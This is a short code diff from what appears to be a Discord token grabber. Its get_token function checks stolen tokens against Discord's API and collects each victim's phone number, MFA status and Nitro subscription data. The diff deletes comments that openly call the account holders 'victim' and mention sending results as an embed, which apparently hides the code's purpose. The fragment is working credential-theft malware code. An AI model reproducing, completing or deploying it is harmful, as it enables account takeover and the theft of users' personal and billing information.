@@ -89,7 +89,7 @@ def get_token():
                     already_check.append(value)
                     headers = {'Authorization': tok, 'Content-Type': 'application/json'}
                     try:
-                        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers) # connecting discord api in order to send the embed
+                        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers) 
                     except: continue
                     if res.status_code == 200:
                         res_json = res.json()
@@ -102,7 +102,7 @@ def get_token():
                         phone = res_json['phone']
                         mfa_enabled = res_json['mfa_enabled']
                         has_nitro = False
-                        res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers) # get the victim's nitro status from discord api
+                        res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers) 
                         nitro_data = res.json()
                         has_nitro = bool(len(nitro_data) > 0)
                         days_left = 0
